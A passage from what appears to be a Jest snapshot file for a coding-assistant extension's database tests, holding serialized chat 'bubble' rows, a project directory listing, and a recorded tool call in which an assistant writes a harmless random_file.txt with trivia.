\":\\"/Users/jonathanafek/src/autofixer/infrastructure/workers\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":4,\\".sh\\":1,\\".json\\":3,\\".html\\":1,\\".jsonc\\":1,\\".mts\\":1},\\"numFiles\\":11}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":67,\\".sh\\":4,\\".yaml\\":5,\\".js\\":4,\\".html\\":4,\\"\\":1,\\".json\\":9,\\".jsonc\\":1,\\".mts\\":1},\\"numFiles\\":96},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations/default\\",\\"fullSubtreeExtensionCounts\\":{\\".sql\\":2},\\"numFiles\\":2}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sql\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/grafana\\",\\"fullSubtreeExtensionCounts\\":{\\".json\\":3,\\".yaml\\":2},\\"numFiles\\":5},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres\\",\\"fullSubtreeExtensionCounts\\":{\\".sql\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter\\",\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/prometheus\\",\\"fullSubtreeExtensionCounts\\":{\\".yml\\":2},\\"numFiles\\":2}],\\"childrenFiles\\":[{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":3,\\".yml\\":2,\\".sql\\":1,\\".md\\":1,\\".json\\":3},\\"numFiles\\":10},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/node_modules\\",\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/__pycache__\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/_samples\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/ai-playground\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":27,\\".tsx\\":82,\\".graphql\\":2,\\".css\\":2,\\".js\\":2,\\".json\\":5,\\".svg\\":1,\\".txt\\":1,\\".png\\":1,\\".ico\\":1,\\".md\\":1,\\".html\\":1},\\"numFiles\\":126},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/app_api\\",\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":22,\\".graphql\\":1,\\".sh\\":1,\\"\\":1,\\".sql\\":36},\\"numFiles\\":61},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/patchino\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":32,\\".json\\":7,\\".jinja2\\":12,\\".txt\\":4,\\"\\":1},\\"numFiles\\":56},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":2},\\"numFiles\\":2}],\\"childrenFiles\\":[{\\"name\\":\\"autoflake.cfg\\"},{\\"name\\":\\"docker-compose.yml\\"},{\\"name\\":\\"example_sampler_config.json\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"poetry.lock\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"pyproject.toml\\"},{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":2,\\".py\\":34,\\".json\\":13,\\".jinja2\\":12,\\".txt\\":5,\\"\\":3,\\".lock\\":1,\\".yml\\":1,\\".md\\":2,\\".toml\\":1,\\".cfg\\":1,\\".ts\\":27,\\".tsx\\":82,\\".graphql\\":3,\\".css\\":2,\\".js\\":2,\\".svg\\":1,\\".png\\":1,\\".ico\\":1,\\".html\\":1,\\".yaml\\":22,\\".sql\\":36},\\"numFiles\\":253},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/htmlcov\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/pycommon\\",\\"fullSubtreeExtensionCounts\\":{\\".jinja2\\":1,\\".py\\":76,\\".json\\":1,\\".graphql\\":1},\\"numFiles\\":79},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/scripts\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".ambr\\":1,\\".py\\":60,\\".json\\":19,\\".java\\":11,\\".xml\\":14,\\".yaml\\":1,\\".fpr\\":3,\\".jsp\\":1,\\".js\\":1},\\"numFiles\\":111}],\\"childrenFiles\\":[{\\"name\\":\\"autoflake.cfg\\"},{\\"name\\":\\"coverage.xml\\"},{\\"name\\":\\"hasura_schema.json\\"},{\\"name\\":\\"junit-result.xml\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"poetry.lock\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"ptw.ini\\"},{\\"name\\":\\"pyproject.toml\\"},{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":1,\\".lock\\":1,\\".py\\":137,\\".ini\\":1,\\".md\\":1,\\".ambr\\":1,\\".json\\":20,\\".java\\":11,\\".xml\\":14,\\".yaml\\":1,\\".toml\\":1,\\".fpr\\":3,\\".jsp\\":1,\\".jinja2\\":1,\\"\\":1,\\".cfg\\":1,\\".graphql\\":1,\\".js\\":1},\\"numFiles\\":198},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts/allowed-queries-generator\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":13,\\".json\\":2,\\".yaml\\":1,\\".js\\":6,\\".py\\":1},\\"numFiles\\":23},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts/analyzer\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":1},\\"numFiles\\":1}],\\"childrenFiles\\":[{\\"name\\":\\"add_issue.sh\\"},{\\"name\\":\\"add_org.sh\\"},{\\"name\\":\\"add_project.sh\\"},{\\"name\\":\\"add_user_to_project.sh\\"},{\\"name\\":\\"add_user.sh\\"},{\\"name\\":\\"check_all_services_online.py\\"},{\\"name\\":\\"check_cli_version.sh\\"},{\\"name\\":\\"cleanup_ecr.sh\\"},{\\"name\\":\\"create_api_token.sh\\"},{\\"name\\":\\"CreateToken.gql\\"},{\\"name\\":\\"deploy_broker_client.sh\\"},{\\"name\\":\\"deploy_env.sh\\"},{\\"name\\":\\"dotenv_vault_login.sh\\"},{\\"name\\":\\"download_fix_data.sh\\"},{\\"name\\":\\"extract_highlight_nodes_source.sh\\"},{\\"name\\":\\"extract_repo.sh\\"},{\\"name\\":\\"filter_ignorefiles.py\\"},{\\"name\\":\\"fix_python_codestyle.sh\\"},{\\"name\\":\\"fix_typescript_codestyle.sh\\"},{\\"name\\":\\"generate_gql_code.sh\\"},{\\"name\\":\\"generate_report.sh\\"},{\\"name\\":\\"highlight_nodes.sh\\"},{\\"name\\":\\"init.sh\\"},{\\"name\\":\\"InitOrganizationAndProject.gql\\"},{\\"name\\":\\"install_global_reqs.sh\\"},{\\"name\\":\\"install_shell_profile.sh\\"},{\\"name\\":\\"login_auth0.sh\\"},{\\"name\\":\\"opengrep_init.sh\\"},{\\"name\\":\\"optimize-vulnerability-report.sh\\"},{\\"name\\":\\"pm2_restarts.sh\\"},{\\"name\\":\\"publish_cli.sh\\"},{\\"name\\":\\"pull_env.sh\\"},{\\"name\\":\\"push_env.sh\\"},{\\"name\\":\\"python_update_lock_files.sh\\"},{\\"name\\":\\"remove_prefix.py\\"},{\\"name\\":\\"restart_failed_pr_workflows.sh\\"},{\\"name\\":\\"smart_build.sh\\"},{\\"name\\":\\"start.sh\\"},{\\"name\\":\\"test_mobb_github_action.sh\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":35,\\".py\\":4,\\".ts\\":13,\\".json\\":2,\\".yaml\\":1,\\".js\\":6,\\".gql\\":2},\\"numFiles\\":63},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/app\\",\\"fullSubtreeExtensionCounts\\":{\\".tsx\\":403,\\".ts\\":257,\\".graphql\\":7,\\".gif\\":4,\\".css\\":2,\\".sh\\":1,\\".js\\":2,\\".json\\":4,\\".md\\":5,\\".png\\":15,\\".svg\\":19,\\".snap\\":1,\\".env\\":1,\\"\\":1,\\".html\\":1},\\"numFiles\\":723},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/app_api\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":3,\\"\\":1,\\".yaml\\":128,\\".graphql\\":1,\\".md\\":1,\\".sql\\":1145},\\"numFiles\\":1279},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/broker\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":6,\\".toml\\":1,\\".js\\":2,\\".json\\":4,\\".graphql\\":1,\\".sh\\":2,\\"\\":2,\\".key\\":1,\\".md\\":1,\\".template\\":1,\\".crt\\":1},\\"numFiles\\":22},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/datadog_postgres_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":2,\\"\\":1},\\"numFiles\\":3},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/interactive_fixer\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":3,\\".lock\\":1,\\".ini\\":1,\\".py\\":16,\\".md\\":1,\\"\\":2,\\".cfg\\":1,\\".toml\\":1},\\"numFiles\\":26},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/node_general_backend\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":116,\\".json\\":26,\\".fpr\\":4,\\".zip\\":4,\\".graphql\\":2,\\".sh\\":1,\\".js\\":2,\\".xml\\":1,\\".java\\":2,\\".diff\\":1,\\"\\":1,\\".txt\\":1},\\"numFiles\\":161},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services/rabbitmq\\",\\"fullSubtreeExtensionCounts\\":{\\"\\":2,\\".conf\\":1},\\"numFiles\\":3}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":10,\\".lock\\":1,\\".ini\\":1,\\".py\\":16,\\".md\\":8,\\".ts\\":379,\\".toml\\":2,\\".js\\":6,\\".json\\":34,\\".graphql\\":11,\\"\\":10,\\".key\\":1,\\".template\\":1,\\".crt\\":1,\\".yaml\\":130,\\".cfg\\":1,\\".sql\\":1145,\\".fpr\\":4,\\".zip\\":4,\\".xml\\":1,\\".java\\":2,\\".diff\\":1,\\".txt\\":1,\\".conf\\":1,\\".tsx\\":403,\\".gif\\":4,\\".css\\":2,\\".png\\":15,\\".svg\\":19,\\".snap\\":1,\\".env\\":1,\\".html\\":1},\\"numFiles\\":2217},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":67,\\".json\\":16,\\".js\\":3,\\".sh\\":4,\\".svg\\":143,\\".graphql\\":2,\\".tsx\\":187},\\"numFiles\\":422}],\\"childrenFiles\\":[{\\"name\\":\\"CLAUDE.md\\"},{\\"name\\":\\"cspell.json\\"},{\\"name\\":\\"docker-bake-gha-cache.hcl\\"},{\\"name\\":\\"docker-compose.yml\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"mypy_ext.ini\\"},{\\"name\\":\\"mypy.ini\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"pnpm-lock.yaml\\"},{\\"name\\":\\"pnpm-workspace.yaml\\"},{\\"name\\":\\"pom.xml\\"},{\\"name\\":\\"readme.md\\"},{\\"name\\":\\"static-analysis.datadog.yml\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":175,\\".json\\":1940,\\".sh\\":79,\\".py\\":1478,\\".ts\\":1296,\\".js\\":163,\\".zip\\":26,\\".graphql\\":47,\\".fpr\\":192,\\".gql\\":2,\\".yml\\":87,\\".ini\\":6,\\".lock\\":6,\\".svg\\":164,\\".md\\":188,\\".sql\\":1193,\\".xml\\":349,\\".html\\":48,\\"\\":1856,\\".csproj\\":84,\\".tsx\\":703,\\".snap\\":30,\\".toml\\":7,\\".jinja2\\":304,\\".key\\":1,\\".template\\":1,\\".crt\\":1,\\".png\\":146,\\".cfg\\":6,\\".lisp\\":167,\\".ambr\\":5,\\".java\\":450,\\".diff\\":12,\\".txt\\":27,\\".conf\\":4,\\".gif\\":4,\\".cs\\":241,\\".jsonc\\":1,\\".mts\\":1,\\".cshtml\\":36,\\".css\\":11,\\".hcl\\":1,\\".ico\\":1,\\".sln\\":3,\\".config\\":5,\\".env\\":2,\\".inference\\":3,\\".jsp\\":9,\\".vscdb\\":2,\\".mjs\\":17,\\".aspx\\":4,\\".c\\":4,\\".cpp\\":1,\\".xsd\\":3,\\".http\\":1,\\".php\\":6,\\".ejs\\":1,\\".user\\":1,\\".go\\":35,\\".mod\\":13,\\".gitignore\\":1,\\".properties\\":13,\\".sqlite3\\":1,\\".xhtml\\":2,\\".sum\\":2,\\".cmd\\":1},\\"numFiles\\":11669}}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-8 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:86d43c02-d432-47cf-baa1-e0b405219934",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"86d43c02-d432-47cf-baa1-e0b405219934","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:33.635Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"86f362d9-b233-416c-ac3c-1486e8b2084c","usageUuid":"9465f1e3-1ebf-4e22-af7a-abf06403f36e","capabilityType":30,"thinking":{"text":"","signature":"1mPkKOA2SsKYpFG6VqRmCykP8-iFGM1eni_KZuCaTCjuTTq8OmV1ZQJAqsBzYX3Gbvk6cAzvPUAv41SiDLXBD5ho9si5102gXNZFbcm5AdL2RVUWbExCQAoELY6dNKmyv7qpHyCfL4C6O0TI1pgOlKQSpDOTozAD45FuqTgzzId8-ps7zsstuxpptmiQuoNcBZRTOjRlfY86IMhTo3NoffI_mYT9UYWd1npcBFgB7kbe33-fNboRrNEKYp60Se83bzrQ5g6yyDO7Iy-Ndo1M2ZlMc-gYFA7BqU_IvL-2arovoi1bCEELWq730IED2U1gWiLuQcEQ14fX_CcZVxJdrDPTPTFuY9Bp0zU"},"thinkingDurationMs":828}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-9 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:b604bdf3-2e76-4f9e-9787-6b23c03937c0",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"b604bdf3-2e76-4f9e-9787-6b23c03937c0","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:37.827Z","isQuickSearchQuery":false,"text":"\\nCreating a simple random file in the repo root:\\n","usageUuid":"9465f1e3-1ebf-4e22-af7a-abf06403f36e"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-10 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:5c0b1d2d-0615-4aa6-9b86-2e1c35baa63c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"5c0b1d2d-0615-4aa6-9b86-2e1c35baa63c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:37.908Z","isQuickSearchQuery":false,"codeBlocks":[{"uri":{"scheme":"file","authority":"","path":"/Users/jonathanafek/src/autofixer/random_file.txt","query":"","fragment":"","_formatted":"file:///Users/jonathanafek/src/autofixer/random_file.txt","_fsPath":"/Users/jonathanafek/src/autofixer/random_file.txt"},"codeblockId":"c2f0cb1d-7811-4dcf-936f-598c39d4d42b","codeBlockIdx":0,"content":"This is a random file created at the repository root!\\n\\nRandom facts:\\n- The average cloud weighs about 1.1 million pounds\\n- Octopuses have three hearts\\n- A day on Venus is longer than its year\\n- Honey never spoils\\n\\nCreated: $(date)\\nRandom number: 42\\nRandom string: abc123xyz\\n\\nHave a great day! 🎲\\n","languageId":"plaintext"}],"text":"","capabilityType":15,"toolFormerData":{"tool":38,"toolIndex":1,"modelCallId":"829e4683-687c-4241-a826-697736b1f190","toolCallId":"tool_7745fd43-9676-4091-84c9-c3ca5d08c8b","status":"completed","rawArgs":"{\\"file_path\\": \\"/Users/jonathanafek/src/autofixer/random_file.txt\\", \\"contents\\": \\"This is a random file created at the repository root!\\\\n\\\\nRandom facts:\\\\n- The average cloud weighs about 1.1 million pounds\\\\n- Octopuses have three hearts\\\\n- A day on Venus is longer than its year\\\\n- Honey never spoils\\\\n\\\\nCreated: $(date)\\\\nRandom number: 42\\\\nRandom string: abc123xyz\\\\n\\\\nHave a great day! 🎲\\\\n\\"}","name":"write","userDecision":"accepted","params":"{\\"relativeWorkspacePath\\":\\"/Users/jonathanafek/src/autofixer/random_file.txt\\"}","additionalData":{"codeblockId":"c2f0cb1d-7811-4dcf-936f-598c39d4d42b","reviewData":{"status":"None","selectedOption":"accept","isShowingInput":false,"firstTimeReviewMode":false}},"result":"{\\"diff\\":{\\"chunks\\":[{\\"diffString\\":\\"- \\\\n+ This is a random file created at the repository root!\\\\n+ \\\\n+ Random facts:\\\\n+ - The average cloud weighs about 1.1 million pounds\\\\n+ - Octopuses have three hearts\\\\n+ - A day on Venus is longer than its year\\\\n+ - Honey never spoils\\\\n+ \\\\n+ Created: $(date)\\\\n+ Random number: 42\\\\n+ Random string: abc123xyz\\\\n+ \\\\n+ Have a great day! 🎲\\\\n+ \\",\\"oldStart\\":1,\\"newStart\\":1,\\"oldLines\\":1,\\"newLines\\":14,\\"linesRemoved\\":1,\\"linesAdded\\":14}],\\"editor\\":\\"EDITOR_AI\\"},\\"shouldAutoFixLints\\":true,\\"resultForModel\\":\\"Wrote contents to /Users/jonathanafek/src/autofixer/random_file.txt.\\",\\"contentsAfterEdit\\":\\"This is a random file created at the repository root!\\\\n\\\\nRandom facts:\\\\n- The average cloud weighs about 1.1 million pounds\\\\n- Octopuses have three hearts\\\\n- A day on Venus is longer than its year\\\\n- Honey never spoils\\\\n\\\\nCreated: $(date)\\\\nRandom number: 42\\\\nRandom string: abc123xyz\\\\n\\\\nHave a great day! 🎲\\\\n\\\\n\\"}"},"checkpointId":"dc687d50-8406-4fc6-8d7e-f49a617395de"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-11 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:98a02221-1a6b-452e-a1f2-8c676df4e040",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"98a02221-1a6b-452e-a1f2-8c676df4e040","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:37.908Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"1f003288-5511-4cbb-b6af-97b63b96633d","usageUuid":"9465f1e3-1ebf-4e22-af7a-abf06403f36e","capabilityType":30,"thinking":{"text":"","signature":"M78aUW16XJTETOjdmj2E0XoU7NZrQNzDyfzso-UMz4q1wAXATqueuln73whcts0frNWYoPi50MBKqLGUGvPGDirsfjlCEikCSV8KBgahgWMkT0x81kICeurMmhG4UNYVfC5QVfSjdjEIh7MErjjW9HguVGGR0aFiD2Ti5MyaTDc0PZH1TV7QGdUSfc6ZGNDTw1tSe7BVQtSbY7MdygYw83mkgSvjQZ0yGI-iiuF1AnPIl660w6K8JbKrcxBsjM5CL8qKWiglEyvvzSRjzGQmO7q3YUjh5J-jIbq0q-AIexhsXuNov-tyXYrLzcTgQ_dE3AQdxPC-XaQw6u267lHf46P-RZAGIzIxbsuSdor25w9RaY_p5tetosV-NBYhPPmPk_9-i2YYGA4iA74nuaBayOPGkr4Cr4aDJjLJ2ijD0kR8Xdoq5w9TenT0Zfs2tYfci3TowW3GlQrCzm8ERZad_ynbrURVCyHh_7Y"},"thinkingDurationMs":1542}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-12 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:c532d981-529d-4f5b-b53e-ca5331cb0271",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"c532d981-529d-4f5b-b53e-ca5331cb0271","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":13229,"outputTokens":489},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:45.987Z","isQuickSearchQuery":false,"text":"\\nCreated a random file \`random_file.txt\` in the repo root with some fun content. It's ready to use.","usageUuid":"9465f1e3-1ebf-4e22-af7a-abf06403f36e"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-13 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:4406afdc-eddf-4217-ba6b-e4e7600f60be",
